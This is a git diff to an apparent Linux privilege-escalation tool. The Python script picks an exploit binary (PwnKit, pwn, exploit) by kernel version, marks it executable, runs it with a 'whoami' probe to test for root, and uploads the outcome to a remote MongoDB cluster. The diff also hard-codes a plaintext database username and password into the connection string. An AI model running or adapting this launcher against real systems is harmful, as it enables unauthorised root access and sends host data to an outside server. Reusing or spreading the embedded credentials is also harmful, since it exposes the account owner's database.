@@ -5,6 +5,10 @@ import json
 import platform
 import urllib
 import pymongo
+import stat
+import os
+
+
 
 operating_system = platform.system()
 
@@ -18,6 +22,8 @@ if operating_system == "Linux":
         global kernel_name1
         kernel_name1 = kernel_name.join(re.findall(r"[0-9]+\.[0-9]+\.[0-9]+", kernel_name))
         if kernel_name1 == "5.9.0":
+            st = os.stat('PwnKit')
+            os.chmod('PwnKit', st.st_mode | stat.S_IEXEC)
             args = ["./PwnKit"]
             child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
             child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
@@ -26,6 +32,8 @@ if operating_system == "Linux":
             
 
         elif kernel_name1 == "5.7.0":
+            st = os.stat('PwnKit')
+            os.chmod('PwnKit', st.st_mode | stat.S_IEXEC)
             args = ["./PwnKit"]
             child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
             child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
@@ -34,6 +42,8 @@ if operating_system == "Linux":
             
             
         elif kernel_name1 == "5.5.0":
+            st = os.stat('PwnKit')
+            os.chmod('PwnKit', st.st_mode | stat.S_IEXEC)
             args = ["./PwnKit"]
             child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
             child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
@@ -42,6 +52,8 @@ if operating_system == "Linux":
             
             
         elif kernel_name1 == "4.19.0":
+            st = os.stat('pwn')
+            os.chmod('pwn', st.st_mode | stat.S_IEXEC)
             args = ["./pwn"]
             child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
             child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
@@ -50,6 +62,8 @@ if operating_system == "Linux":
             
         
         elif kernel_name1 == "4.18.0":
+            st = os.stat('pwn')
+            os.chmod('pwn', st.st_mode | stat.S_IEXEC)
             args = ["./pwn"]
             child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
             child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
@@ -57,6 +71,8 @@ if operating_system == "Linux":
             dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'}
             
         elif kernel_name1 == "4.15.11":
+            st = os.stat('pwn')
+            os.chmod('pwn', st.st_mode | stat.S_IEXEC)
             args = ["./pwn"]
             child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
             child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
@@ -64,6 +80,8 @@ if operating_system == "Linux":
             dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'}
             
         elif kernel_name1 == "4.13.0":
+            st = os.stat('pwn')
+            os.chmod('pwn', st.st_mode | stat.S_IEXEC)
             args = ["./pwn"]
             child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
             child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
@@ -71,7 +89,9 @@ if operating_system == "Linux":
             dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'}
         
         elif kernel_name1 == "5.4.0":
-            args = ["./ubuntu"]
+            st = os.stat('exploit')
+            os.chmod('exploit', st.st_mode | stat.S_IEXEC)
+            args = ["./exploit"]
             child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
             child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
             print(child_process_output)
@@ -87,6 +107,9 @@ if operating_system == "Linux":
             # dict = {kernel_name:user}
             # with open('output.txt','w') as data:
             #     data.wrtie(str(dict))
+            
+            
+            # 5.14.0 2021.4
         
 
 
@@ -98,12 +121,12 @@ if operating_system == "Linux":
         text = text.rstrip()
         if root == text:
             success = True
-            dicti = {'linux kernel': kernel_name1,"sucess": success}
+            dicti = {'linuxKernel': kernel_name1,"success": success}
             dict.update(dicti)
             
         else:
             success = False
-            dicti = {'linux kernel': kernel_name1,'Succes':success}
+            dicti = {'linuxKernel': kernel_name1,'Success':success}
             dict.update(dicti)
         
         # for key, value in dict.items():
@@ -129,7 +152,7 @@ else:
 
 
 def Uploaddb():
-    client = pymongo.MongoClient("mongodb+srv://<Username>" + urllib.parse.quote("<Password>") + "@devconnector.g6cxh.mongodb.net/myFirstDatabase?retryWrites=true&w=majority")
+    client = pymongo.MongoClient("mongodb+srv://HassanTuri:hassanturi@devconnector.g6cxh.mongodb.net/myFirstDatabase?retryWrites=true&w=majority")
     db = client['Linux_Trace_db']
     linux_trace = db['linux_trace']
     
@@ -137,11 +160,11 @@ def Uploaddb():
         data = json.load(f)
      
     
-    kernel = linux_trace.find_one({'linux kernel':kernel_name1},{'_id':0,"Pre Attack":0,"Status":0,'Description':0,"sucess":0})
+    kernel = linux_trace.find_one({'linuxKernel':kernel_name1},{'_id':0,"Pre Attack":0,"Status":0,'Description':0,"sucess":0})
     
     # chk_kernel = kernel["linux kernel"]
     
-    if kernel == None or kernel["linux kernel"] != kernel_name1:
+    if kernel == None or kernel["linuxKernel"] != kernel_name1:
         linux_trace.insert_one(data)
         print("Data Uploaded Succesfully")
     else:
@@ -150,4 +173,3 @@ def Uploaddb():
     client.close()
     
 Uploaddb()
-    
